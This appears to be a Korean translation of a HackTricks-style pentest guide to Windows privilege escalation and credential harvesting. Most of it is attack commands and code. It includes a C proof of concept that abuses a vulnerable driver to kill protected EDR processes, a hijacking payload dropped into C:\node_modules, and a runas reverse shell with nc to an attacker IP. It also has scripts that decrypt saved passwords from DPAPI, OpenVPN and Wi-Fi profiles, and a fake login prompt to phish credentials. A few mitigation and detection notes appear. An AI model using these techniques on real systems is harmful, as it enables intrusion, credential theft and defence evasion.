### Recovery Actions

Windows는 사용자가 서비스가 실패했을 때 수행할 작업을 지정할 수 있게 합니다. 이 기능은 binary를 가리키도록 설정할 수 있습니다. 이 binary를 교체할 수 있다면, privilege escalation이 가능할 수 있습니다. 더 자세한 내용은 [official documentation](<https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/cc753662(v=ws.11)?redirectedfrom=MSDN>)에서 확인할 수 있습니다.

## Applications

### Installed Applications

**binaries**의 권한을 확인하고(어쩌면 하나를 덮어써서 privileges를 상승시킬 수 있습니다) **folders**의 권한도 확인하세요([DLL Hijacking](dll-hijacking/index.html)).
```bash
dir /a "C:\Program Files"
dir /a "C:\Program Files (x86)"
reg query HKEY_LOCAL_MACHINE\SOFTWARE

Get-ChildItem 'C:\Program Files', 'C:\Program Files (x86)' | ft Parent,Name,LastWriteTime
Get-ChildItem -path Registry::HKEY_LOCAL_MACHINE\SOFTWARE | ft Name
```
### 쓰기 권한

어떤 config file을 수정해서 some special file을 읽을 수 있는지, 또는 Administrator account로 실행될 binary를 수정할 수 있는지 확인하세요 (schedtasks).

시스템에서 weak folder/files permissions를 찾는 한 가지 방법은 다음과 같습니다:
```bash
accesschk.exe /accepteula
# Find all weak folder permissions per drive.
accesschk.exe -uwdqs Users c:\
accesschk.exe -uwdqs "Authenticated Users" c:\
accesschk.exe -uwdqs "Everyone" c:\
# Find all weak file permissions per drive.
accesschk.exe -uwqs Users c:\*.*
accesschk.exe -uwqs "Authenticated Users" c:\*.*
accesschk.exe -uwdqs "Everyone" c:\*.*
```

```bash
icacls "C:\Program Files\*" 2>nul | findstr "(F) (M) :\" | findstr ":\ everyone authenticated users todos %username%"
icacls ":\Program Files (x86)\*" 2>nul | findstr "(F) (M) C:\" | findstr ":\ everyone authenticated users todos %username%"
```

```bash
Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'Everyone'} } catch {}}

Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'BUILTIN\Users'} } catch {}}
```
### Notepad++ plugin autoload persistence/execution

Notepad++는 `plugins` 하위 폴더 아래의 모든 plugin DLL을 자동으로 로드한다. 쓰기 가능한 portable/copy install이 있으면, 악성 plugin을 넣는 것만으로 매 실행 시 `notepad++.exe` 내부에서 자동 code execution이 가능하다(DllMain과 plugin callbacks 포함).

{{#ref}}
notepad-plus-plus-plugin-autoload-persistence.md
{{#endref}}

### Run at startup

**다른 user에 의해 실행될 registry나 binary를 덮어쓸 수 있는지 확인하라.**\
**권한을 상승시킬 수 있는 흥미로운 autoruns locations에 대해 더 알아보려면** 다음 페이지를 **읽어라**:


{{#ref}}
privilege-escalation-with-autorun-binaries.md
{{#endref}}

### Drivers

가능한 **third party weird/vulnerable** drivers를 찾아라
```bash
driverquery
driverquery.exe /fo table
driverquery /SI
```
If a driver exposes an arbitrary kernel read/write primitive (common in poorly designed IOCTL handlers), you can escalate by stealing a SYSTEM token directly from kernel memory. See the step‑by‑step technique here:

{{#ref}}
arbitrary-kernel-rw-token-theft.md
{{#endref}}

For race-condition bugs where the vulnerable call opens an attacker-controlled Object Manager path, deliberately slowing the lookup (using max-length components or deep directory chains) can stretch the window from microseconds to tens of microseconds:

{{#ref}}
kernel-race-condition-object-manager-slowdown.md
{{#endref}}

#### Registry hive memory corruption primitives

Modern hive vulnerabilities let you groom deterministic layouts, abuse writable HKLM/HKU descendants, and convert metadata corruption into kernel paged-pool overflows without a custom driver. Learn the full chain here:

{{#ref}}
windows-registry-hive-exploitation.md
{{#endref}}

#### Abusing missing FILE_DEVICE_SECURE_OPEN on device objects (LPE + EDR kill)

Some signed third‑party drivers create their device object with a strong SDDL via IoCreateDeviceSecure but forget to set FILE_DEVICE_SECURE_OPEN in DeviceCharacteristics. Without this flag, the secure DACL is not enforced when the device is opened through a path containing an extra component, letting any unprivileged user obtain a handle by using a namespace path like:

- \\ .\\DeviceName\\anything
- \\ .\\amsdk\\anyfile (from a real-world case)

Once a user can open the device, privileged IOCTLs exposed by the driver can be abused for LPE and tampering. Example capabilities observed in the wild:
- Return full-access handles to arbitrary processes (token theft / SYSTEM shell via DuplicateTokenEx/CreateProcessAsUser).
- Unrestricted raw disk read/write (offline tampering, boot-time persistence tricks).
- Terminate arbitrary processes, including Protected Process/Light (PP/PPL), allowing AV/EDR kill from user land via kernel.

Minimal PoC pattern (user mode):
```c
// Example based on a vulnerable antimalware driver
#define IOCTL_REGISTER_PROCESS  0x80002010
#define IOCTL_TERMINATE_PROCESS 0x80002048

HANDLE h = CreateFileA("\\\\.\\amsdk\\anyfile", GENERIC_READ|GENERIC_WRITE, 0, 0, OPEN_EXISTING, 0, 0);
DWORD me = GetCurrentProcessId();
DWORD target = /* PID to kill or open */;
DeviceIoControl(h, IOCTL_REGISTER_PROCESS,  &me,     sizeof(me),     0, 0, 0, 0);
DeviceIoControl(h, IOCTL_TERMINATE_PROCESS, &target, sizeof(target), 0, 0, 0, 0);
```
개발자를 위한 완화 방안
- DACL로 제한되도록 의도한 디바이스 객체를 만들 때는 항상 FILE_DEVICE_SECURE_OPEN을 설정하세요.
- 권한이 필요한 작업에 대해서는 호출자 컨텍스트를 검증하세요. 프로세스 종료나 handle 반환을 허용하기 전에 PP/PPL 검사를 추가하세요.
- IOCTLs를 제한하세요(액세스 마스크, METHOD_*, 입력 검증). 또한 직접적인 kernel 권한 대신 brokered 모델을 고려하세요.

방어자를 위한 탐지 아이디어
- 의심스러운 디바이스 이름(예: \\ .\\amsdk*)에 대한 user-mode open과 악용을 시사하는 특정 IOCTL 시퀀스를 모니터링하세요.
- Microsoft의 vulnerable driver blocklist(HVCI/WDAC/Smart App Control)를 적용하고, 자체 allow/deny 목록도 유지하세요.


## PATH DLL Hijacking

PATH에 포함된 폴더 안에 **쓰기 권한**이 있다면, 프로세스가 로드하는 DLL을 하ijack하여 **권한 상승**을 할 수 있습니다.

PATH 안의 모든 폴더에 대한 권한을 확인하세요:
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
더 자세한 내용은 이 체크를 어떻게 악용하는지에 대해:


{{#ref}}
dll-hijacking/writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

## C:\node_modules를 통한 Node.js / Electron module resolution hijacking

이것은 **Windows uncontrolled search path** 변형으로, **Node.js** 및 **Electron** 애플리케이션이 `require("foo")` 같은 bare import를 수행할 때 예상한 module이 **missing**이면 영향을 받습니다.

Node는 디렉터리 트리를 거슬러 올라가며 각 parent에서 `node_modules` 폴더를 확인해 package를 resolve합니다. Windows에서는 그 탐색이 drive root까지 도달할 수 있으므로, `C:\Users\Administrator\project\app.js`에서 실행된 애플리케이션은 다음 경로를 probe하게 될 수 있습니다:

1. `C:\Users\Administrator\project\node_modules\foo`
2. `C:\Users\Administrator\node_modules\foo`
3. `C:\Users\node_modules\foo`
4. `C:\node_modules\foo`

**low-privileged user**가 `C:\node_modules`를 만들 수 있다면, 악성 `foo.js`(또는 package folder)를 배치해 두고, 더 **높은 권한의 Node/Electron process**가 누락된 dependency를 resolve하기를 기다릴 수 있습니다. payload는 피해자 process의 security context에서 실행되므로, 대상이 administrator로 실행되거나, elevated scheduled task/service wrapper에서 실행되거나, auto-start된 privileged desktop app에서 실행될 때 **LPE**가 됩니다.

이는 특히 다음 경우에 흔합니다:

- dependency가 `optionalDependencies`에 선언되어 있는 경우
- third-party library가 `require("foo")`를 `try/catch`로 감싸고 실패해도 계속 진행하는 경우
- package가 production build에서 제거되었거나, packaging 중 누락되었거나, 설치에 실패한 경우
- 취약한 `require()`가 main application code가 아니라 dependency tree 깊숙한 곳에 있는 경우

### 취약한 대상 찾기

**Procmon**을 사용해 resolution path를 확인합니다:

- Filter by `Process Name` = target executable (`node.exe`, Electron app EXE, 또는 wrapper process)
- Filter by `Path` `contains` `node_modules`
- `NAME NOT FOUND`와 `C:\node_modules` 아래의 최종 성공적인 open에 집중

압축 해제된 `.asar` 파일이나 application sources에서 유용한 code-review patterns:
```bash
rg -n 'require\\("[^./]' .
rg -n "require\\('[^./]" .
rg -n 'optionalDependencies' .
rg -n 'try[[:space:]]*\\{[[:space:][:print:]]*require\\(' .
```
### Exploitation

1. Procmon 또는 소스 검토를 통해 **누락된 패키지 이름**을 식별한다.
2. 존재하지 않으면 root lookup 디렉터리를 생성한다:
```powershell
mkdir C:\node_modules
```
3. 정확히 예상되는 이름의 module을 드롭:
```javascript
// C:\node_modules\foo.js
require("child_process").exec("calc.exe")
module.exports = {}
```
4. 취약한 애플리케이션을 트리거한다. 애플리케이션이 `require("foo")`를 시도하고 정식 모듈이 없으면, Node는 `C:\node_modules\foo.js`를 로드할 수 있다.

이 패턴에 맞는 누락된 optional module의 실제 예로는 `bluebird`와 `utf-8-validate`가 있지만, 핵심은 재사용 가능한 **technique**이다: 권한이 있는 Windows Node/Electron 프로세스가 resolve할 수 있는 모든 **missing bare import**를 찾아라.

### Detection and hardening ideas

- 사용자가 `C:\node_modules`를 생성하거나 그 안에 새 `.js` 파일/package를 쓸 때 alert.
- high-integrity process가 `C:\node_modules\*`에서 읽는 것을 hunt.
- production에서는 모든 runtime dependency를 패키징하고 `optionalDependencies` 사용을 audit.
- third-party code의 조용한 `try { require("...") } catch {}` 패턴을 review.
- library가 지원하는 경우 optional probe를 disable한다(예: 일부 `ws` deployment는 `WS_NO_UTF_8_VALIDATE=1`로 legacy `utf-8-validate` probe를 피할 수 있다).

## Network

### Shares
```bash
net view #Get a list of computers
net view /all /domain [domainname] #Shares on the domains
net view \\computer /ALL #List shares of a computer
net use x: \\computer\share #Mount the share locally
net share #Check current shares
```
### hosts file

hosts file에 하드코딩된 다른 알려진 컴퓨터가 있는지 확인하세요
```
type C:\Windows\System32\drivers\etc\hosts
```
### 네트워크 인터페이스 및 DNS
```
ipconfig /all
Get-NetIPConfiguration | ft InterfaceAlias,InterfaceDescription,IPv4Address
Get-DnsClientServerAddress -AddressFamily IPv4 | ft
```
### Open Ports

외부에서 **restricted services**를 확인하세요
```bash
netstat -ano #Opened ports?
```
### 라우팅 테이블
```
route print
Get-NetRoute -AddressFamily IPv4 | ft DestinationPrefix,NextHop,RouteMetric,ifIndex
```
### ARP Table
```
arp -A
Get-NetNeighbor -AddressFamily IPv4 | ft ifIndex,IPAddress,L
```
### 방화벽 규칙

[**방화벽 관련 명령은 이 페이지를 확인하세요**](../basic-cmd-for-pentesters.md#firewall) **(규칙 나열, 규칙 생성, 끄기, 끄기...)**

네트워크 열거를 위한 더 많은 [명령은 여기](../basic-cmd-for-pentesters.md#network)

### Windows Subsystem for Linux (wsl)
```bash
C:\Windows\System32\bash.exe
C:\Windows\System32\wsl.exe
```
Binary `bash.exe`는 `C:\Windows\WinSxS\amd64_microsoft-windows-lxssbash_[...]\bash.exe`에서도 찾을 수 있습니다.

root 사용자 권한을 얻으면 모든 포트에서 리슨할 수 있습니다(`nc.exe`를 사용해 포트를 리슨하는 첫 번째 경우에는 GUI로 `nc`를 방화벽에서 허용할지 묻습니다).
```bash
wsl whoami
./ubuntun1604.exe config --default-user root
wsl whoami
wsl python -c 'BIND_OR_REVERSE_SHELL_PYTHON_CODE'
```
bash를 root로 쉽게 시작하려면 `--default-user root`를 시도할 수 있습니다

`WSL` 파일시스템은 `C:\Users\%USERNAME%\AppData\Local\Packages\CanonicalGroupLimited.UbuntuonWindows_79rhkp1fndgsc\LocalState\rootfs\` 폴더에서 탐색할 수 있습니다

## Windows Credentials

### Winlogon Credentials
```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr /i "DefaultDomainName DefaultUserName DefaultPassword AltDefaultDomainName AltDefaultUserName AltDefaultPassword LastUsedUsername"

#Other way
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultPassword
```
### Credentials manager / Windows vault

From [https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault](https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault)\
Windows Vault는 서버, 웹사이트 및 기타 프로그램에 대한 사용자 자격 증명을 저장하며, **Windows**가 사용자에게 **자동으로 로그인**할 수 있게 합니다. 처음 보면 이제 사용자가 Facebook 자격 증명, Twitter 자격 증명, Gmail 자격 증명 등을 저장해서 브라우저를 통해 자동으로 로그인할 수 있는 것처럼 보일 수 있습니다. 하지만 그렇지 않습니다.

Windows Vault는 Windows가 사용자에게 자동으로 로그인할 수 있는 자격 증명을 저장합니다. 즉, **리소스(서버 또는 웹사이트)에 접근하기 위해 자격 증명이 필요한 모든 Windows 애플리케이션**은 이 **Credential Manager**와 Windows Vault를 사용하여 사용자가 매번 사용자 이름과 비밀번호를 입력하는 대신 제공된 자격 증명을 사용할 수 있습니다.

애플리케이션이 Credential Manager와 상호작용하지 않는 한, 특정 리소스에 대한 자격 증명을 사용하는 것은 불가능하다고 생각합니다. 따라서 애플리케이션이 vault를 사용하려면, 어떤 방식으로든 **credential manager와 통신하여 기본 저장 vault에서 해당 리소스의 자격 증명을 요청**해야 합니다.

`cmdkey`를 사용하여 머신에 저장된 자격 증명을 나열하세요.
```bash
cmdkey /list
Currently stored credentials:
Target: Domain:interactive=WORKGROUP\Administrator
Type: Domain Password
User: WORKGROUP\Administrator
```
그런 다음 `runas`를 `/savecred` 옵션과 함께 사용하여 저장된 자격 증명을 사용할 수 있습니다. 다음 예시는 SMB share를 통해 원격 binary를 호출합니다.
```bash
runas /savecred /user:WORKGROUP\Administrator "\\10.XXX.XXX.XXX\SHARE\evil.exe"
```
제공된 credential 집합과 함께 `runas` 사용하기.
```bash
C:\Windows\System32\runas.exe /env /noprofile /user:<username> <password> "c:\users\Public\nc.exe -nc <attacker-ip> 4444 -e cmd.exe"
```
Note that mimikatz, lazagne, [credentialfileview](https://www.nirsoft.net/utils/credentials_file_view.html), [VaultPasswordView](https://www.nirsoft.net/utils/vault_password_view.html), or from [Empire Powershells module](https://github.com/EmpireProject/Empire/blob/master/data/module_source/credentials/dumpCredStore.ps1).

### DPAPI

**Data Protection API (DPAPI)**는 데이터를 대칭 암호화하는 방법을 제공하며, 주로 Windows 운영 체제에서 비대칭 개인 키를 대칭 암호화하는 데 사용된다. 이 암호화는 사용자 또는 시스템 비밀을 활용하여 엔트로피를 크게 높인다.

**DPAPI는 사용자의 로그인 비밀에서 파생된 대칭 키를 통해 키를 암호화할 수 있게 해준다**. 시스템 암호화가 필요한 경우에는 시스템의 도메인 인증 비밀을 사용한다.

DPAPI를 사용해 암호화된 사용자 RSA 키는 `%APPDATA%\Microsoft\Protect\{SID}` 디렉터리에 저장되며, 여기서 `{SID}`는 사용자의 [Security Identifier](https://en.wikipedia.org/wiki/Security_Identifier)를 의미한다. **사용자의 개인 키를 같은 파일에서 보호하는 마스터 키와 함께 위치한 DPAPI 키**는 일반적으로 64바이트의 임의 데이터로 구성된다. (이 디렉터리는 접근이 제한되어 있어 CMD의 `dir` 명령으로는 내용을 나열할 수 없지만, PowerShell에서는 나열할 수 있다는 점에 유의해야 한다.)
```bash
Get-ChildItem  C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem  C:\Users\USER\AppData\Local\Microsoft\Protect\
```
You can use **mimikatz module** `dpapi::masterkey` with the appropriate arguments (`/pvk` or `/rpc`) to decrypt it.

**master password**로 보호된 **credentials files**는 보통 다음 위치에 있습니다:
```bash
dir C:\Users\username\AppData\Local\Microsoft\Credentials\
dir C:\Users\username\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```
You can use **mimikatz module** `dpapi::cred` with the appropiate `/masterkey` to decrypt.\
You can **extract many DPAPI** **masterkeys** from **memory** with the `sekurlsa::dpapi` module (if you are root).


{{#ref}}
dpapi-extracting-passwords.md
{{#endref}}

### PowerShell Credentials

**PowerShell credentials**는 **scripting** 및 automation 작업에서 encrypted credentials를 편리하게 저장하는 용도로 자주 사용됩니다. 이 credentials는 **DPAPI**로 보호되며, 일반적으로 생성된 동일한 컴퓨터의 동일한 사용자만 decrypt할 수 있다는 의미입니다.

파일에 들어 있는 PS credentials를 **decrypt**하려면 다음을 수행할 수 있습니다:
```bash
PS C:\> $credential = Import-Clixml -Path 'C:\pass.xml'
PS C:\> $credential.GetNetworkCredential().username

john

PS C:\htb> $credential.GetNetworkCredential().password

JustAPWD!
```
### Wifi
```bash
#List saved Wifi using
netsh wlan show profile
#To get the clear-text password use
netsh wlan show profile <SSID> key=clear
#Oneliner to extract all wifi passwords
cls & echo. & for /f "tokens=3,* delims=: " %a in ('netsh wlan show profiles ^| find "Profile "') do @echo off > nul & (netsh wlan show profiles name="%b" key=clear | findstr "SSID Cipher Content" | find /v "Number" & echo.) & @echo on*
```
### 저장된 RDP 연결

`HKEY_USERS\<SID>\Software\Microsoft\Terminal Server Client\Servers\`\
와 `HKCU\Software\Microsoft\Terminal Server Client\Servers\`에서 찾을 수 있습니다.

### 최근 실행된 명령어
```
HCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
HKCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
```
### **원격 데스크톱 Credential Manager**
```
%localappdata%\Microsoft\Remote Desktop Connection Manager\RDCMan.settings
```
Use the **Mimikatz** `dpapi::rdg` module with appropriate `/masterkey` to **decrypt any .rdg files**\
You can **extract many DPAPI masterkeys** from memory with the Mimikatz `sekurlsa::dpapi` module

### Sticky Notes

People often use the StickyNotes app on Windows workstations to **save passwords** and other information, not realizing it is a database file. This file is located at `C:\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite` and is always worth searching for and examining.

### AppCmd.exe

**Note that to recover passwords from AppCmd.exe you need to be Administrator and run under a High Integrity level.**\
**AppCmd.exe** is located in the `%systemroot%\system32\inetsrv\` directory.\
If this file exists then it is possible that some **credentials** have been configured and can be **recovered**.

This code was extracted from [**PowerUP**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1):
```bash
function Get-ApplicationHost {
$OrigError = $ErrorActionPreference
$ErrorActionPreference = "SilentlyContinue"

# Check if appcmd.exe exists
if (Test-Path  ("$Env:SystemRoot\System32\inetsrv\appcmd.exe")) {
# Create data table to house results
$DataTable = New-Object System.Data.DataTable

# Create and name columns in the data table
$Null = $DataTable.Columns.Add("user")
$Null = $DataTable.Columns.Add("pass")
$Null = $DataTable.Columns.Add("type")
$Null = $DataTable.Columns.Add("vdir")
$Null = $DataTable.Columns.Add("apppool")

# Get list of application pools
Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppools /text:name" | ForEach-Object {

# Get application pool name
$PoolName = $_

# Get username
$PoolUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.username"
$PoolUser = Invoke-Expression $PoolUserCmd

# Get password
$PoolPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.password"
$PoolPassword = Invoke-Expression $PoolPasswordCmd

# Check if credentials exists
if (($PoolPassword -ne "") -and ($PoolPassword -isnot [system.array])) {
# Add credentials to database
$Null = $DataTable.Rows.Add($PoolUser, $PoolPassword,'Application Pool','NA',$PoolName)
}
}

# Get list of virtual directories
Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir /text:vdir.name" | ForEach-Object {

# Get Virtual Directory Name
$VdirName = $_

# Get username
$VdirUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:userName"
$VdirUser = Invoke-Expression $VdirUserCmd

# Get password
$VdirPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:password"
$VdirPassword = Invoke-Expression $VdirPasswordCmd

# Check if credentials exists
if (($VdirPassword -ne "") -and ($VdirPassword -isnot [system.array])) {
# Add credentials to database
$Null = $DataTable.Rows.Add($VdirUser, $VdirPassword,'Virtual Directory',$VdirName,'NA')
}
}

# Check if any passwords were found
if( $DataTable.rows.Count -gt 0 ) {
# Display results in list view that can feed into the pipeline
$DataTable |  Sort-Object type,user,pass,vdir,apppool | Select-Object user,pass,type,vdir,apppool -Unique
}
else {
# Status user
Write-Verbose 'No application pool or virtual directory passwords were found.'
$False
}
}
else {
Write-Verbose 'Appcmd.exe does not exist in the default location.'
$False
}
$ErrorActionPreference = $OrigError
}
```
### SCClient / SCCM

`C:\Windows\CCM\SCClient.exe`가 존재하는지 확인하세요 .\
설치 프로그램은 **SYSTEM 권한으로 실행**되며, 많은 경우 **DLL Sideloading (Info from** [**https://github.com/enjoiz/Privesc**](https://github.com/enjoiz/Privesc)**).** 에 취약합니다.
```bash
$result = Get-WmiObject -Namespace "root\ccm\clientSDK" -Class CCM_Application -Property * | select Name,SoftwareVersion
if ($result) { $result }
else { Write "Not Installed." }
```
## Files and Registry (Credentials)

### Putty 자격 증명
```bash
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s | findstr "HKEY_CURRENT_USER HostName PortNumber UserName PublicKeyFile PortForwardings ConnectionSharing ProxyPassword ProxyUsername" #Check the values saved in each session, user/password could be there
```
### Putty SSH Host Keys
```
reg query HKCU\Software\SimonTatham\PuTTY\SshHostKeys\
```
### 레지스트리의 SSH keys

SSH private keys는 레지스트리 키 `HKCU\Software\OpenSSH\Agent\Keys` 안에 저장될 수 있으므로, 그 안에 흥미로운 것이 있는지 확인해야 합니다:
```bash
reg query 'HKEY_CURRENT_USER\Software\OpenSSH\Agent\Keys'
```
그 경로 안에서 어떤 항목을 찾으면, 아마 저장된 SSH key일 것입니다. 이것은 암호화되어 저장되지만 [https://github.com/ropnop/windows_sshagent_extract](https://github.com/ropnop/windows_sshagent_extract)를 사용하면 쉽게 복호화할 수 있습니다.\
이 technique에 대한 더 많은 정보는 여기에서 확인하세요: [https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

`ssh-agent` service가 실행 중이 아니고, 부팅 시 자동으로 시작되게 하려면 다음을 실행하세요:
```bash
Get-Service ssh-agent | Set-Service -StartupType Automatic -PassThru | Start-Service
```
> [!TIP]
> 이 technique는 더 이상 유효하지 않은 것 같습니다. 일부 ssh keys를 만들어 `ssh-add`로 추가한 다음 ssh를 통해 machine에 login해 보았습니다. registry HKCU\Software\OpenSSH\Agent\Keys는 존재하지 않았고 procmon은 asymmetric key authentication 중 `dpapi.dll`의 사용을 식별하지 못했습니다.

### Unattended files
```
C:\Windows\sysprep\sysprep.xml
C:\Windows\sysprep\sysprep.inf
C:\Windows\sysprep.inf
C:\Windows\Panther\Unattended.xml
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattend\Unattend.xml
C:\Windows\Panther\Unattend\Unattended.xml
C:\Windows\System32\Sysprep\unattend.xml
C:\Windows\System32\Sysprep\unattended.xml
C:\unattend.txt
C:\unattend.inf
dir /s *sysprep.inf *sysprep.xml *unattended.xml *unattend.xml *unattend.txt 2>nul
```
**metasploit**로도 다음 파일들을 검색할 수 있습니다: _post/windows/gather/enum_unattend_

예시 내용:
```xml
<component name="Microsoft-Windows-Shell-Setup" publicKeyToken="31bf3856ad364e35" language="neutral" versionScope="nonSxS" processorArchitecture="amd64">
<AutoLogon>
<Password>U2VjcmV0U2VjdXJlUGFzc3dvcmQxMjM0Kgo==</Password>
<Enabled>true</Enabled>
<Username>Administrateur</Username>
</AutoLogon>

<UserAccounts>
<LocalAccounts>
<LocalAccount wcm:action="add">
<Password>*SENSITIVE*DATA*DELETED*</Password>
<Group>administrators;users</Group>
<Name>Administrateur</Name>
</LocalAccount>
</LocalAccounts>
</UserAccounts>
```
### SAM & SYSTEM backups
```bash
# Usually %SYSTEMROOT% = C:\Windows
%SYSTEMROOT%\repair\SAM
%SYSTEMROOT%\System32\config\RegBack\SAM
%SYSTEMROOT%\System32\config\SAM
%SYSTEMROOT%\repair\system
%SYSTEMROOT%\System32\config\SYSTEM
%SYSTEMROOT%\System32\config\RegBack\system
```
### Cloud Credentials
```bash
#From user home
.aws\credentials
AppData\Roaming\gcloud\credentials.db
AppData\Roaming\gcloud\legacy_credentials
AppData\Roaming\gcloud\access_tokens.db
.azure\accessTokens.json
.azure\azureProfile.json
```
### McAfee SiteList.xml

**SiteList.xml** 파일을 검색하십시오.

### Cached GPP Pasword

이전에 Group Policy Preferences (GPP)를 통해 여러 머신의 그룹에 custom local administrator 계정을 배포할 수 있는 기능이 있었습니다. 하지만 이 방법은 심각한 보안 결함이 있었습니다. 첫째, SYSVOL에 XML 파일로 저장되는 Group Policy Objects (GPOs)는 모든 domain user가 접근할 수 있었습니다. 둘째, 공개적으로 문서화된 default key를 사용해 AES256으로 암호화된 이러한 GPP의 password는 인증된 모든 사용자가 복호화할 수 있었습니다. 이는 사용자가 elevated privileges를 얻을 수 있게 할 수 있으므로 심각한 위험이었습니다.

이 위험을 완화하기 위해, "cpassword" 필드가 비어 있지 않은 locally cached GPP 파일을 검색하는 function이 개발되었습니다. 이러한 파일을 찾으면, function은 password를 decrypt하고 custom PowerShell object를 반환합니다. 이 object에는 GPP와 파일 위치에 대한 세부 정보가 포함되어 있어, 이 security vulnerability를 식별하고 remediation하는 데 도움이 됩니다.

다음 파일을 `C:\ProgramData\Microsoft\Group Policy\history` 또는 _**C:\Documents and Settings\All Users\Application Data\Microsoft\Group Policy\history** (previous to W Vista)_ 에서 검색하십시오:

- Groups.xml
- Services.xml
- Scheduledtasks.xml
- DataSources.xml
- Printers.xml
- Drives.xml

**cPassword를 decrypt하려면:**
```bash
#To decrypt these passwords you can decrypt it using
gpp-decrypt j1Uyj3Vx8TY9LtLZil2uAuZkFQA/4latT76ZwgdHdhw
```
crackmapexec를 사용하여 비밀번호를 얻기:
```bash
crackmapexec smb 10.10.10.10 -u username -p pwd -M gpp_autologin
```
### IIS Web Config
```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```

```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
type C:\Windows\Microsoft.NET\Framework644.0.30319\Config\web.config | findstr connectionString
C:\inetpub\wwwroot\web.config
```

```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
Get-Childitem –Path C:\xampp\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```
웹.config의 자격 증명 예시:
```xml
<authentication mode="Forms">
<forms name="login" loginUrl="/admin">
<credentials passwordFormat = "Clear">
<user name="Administrator" password="SuperAdminPassword" />
</credentials>
</forms>
</authentication>
```
### OpenVPN 자격 증명
```csharp
Add-Type -AssemblyName System.Security
$keys = Get-ChildItem "HKCU:\Software\OpenVPN-GUI\configs"
$items = $keys | ForEach-Object {Get-ItemProperty $_.PsPath}

foreach ($item in $items)
{
$encryptedbytes=$item.'auth-data'
$entropy=$item.'entropy'
$entropy=$entropy[0..(($entropy.Length)-2)]

$decryptedbytes = [System.Security.Cryptography.ProtectedData]::Unprotect(
$encryptedBytes,
$entropy,
[System.Security.Cryptography.DataProtectionScope]::CurrentUser)

Write-Host ([System.Text.Encoding]::Unicode.GetString($decryptedbytes))
}
```
### Logs
```bash
# IIS
C:\inetpub\logs\LogFiles\*

#Apache
Get-Childitem –Path C:\ -Include access.log,error.log -File -Recurse -ErrorAction SilentlyContinue
```
### 자격 증명 요청

사용자가 알고 있을 수 있다고 생각된다면 언제든지 **사용자에게 자신의 자격 증명이나 다른 사용자의 자격 증명까지 입력하라고 요청할 수 있습니다** (클라이언트에게 직접 **자격 증명**을 **요청하는 것**은 정말 **위험**하다는 점에 유의하세요):
```bash
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+[Environment]::UserName,[Environment]::UserDomainName); $cred.getnetworkcredential().password
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\\'+'anotherusername',[Environment]::UserDomainName); $cred.getnetworkcredential().password

#Get plaintext
$cred.GetNetworkCredential() | fl
```
### **자격 증명이 포함될 수 있는 파일 이름**

과거에 **passwords**가 **clear-text** 또는 **Base64**로 포함되어 있던 알려진 파일들
```bash
$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history
vnc.ini, ultravnc.ini, *vnc*
web.config
php.ini httpd.conf httpd-xampp.conf my.ini my.cnf (XAMPP, Apache, PHP)
SiteList.xml #McAfee
ConsoleHost_history.txt #PS-History
*.gpg
*.pgp
*config*.php
elasticsearch.y*ml
kibana.y*ml
*.p12
*.der
*.csr
*.cer
known_hosts
id_rsa
id_dsa
*.ovpn
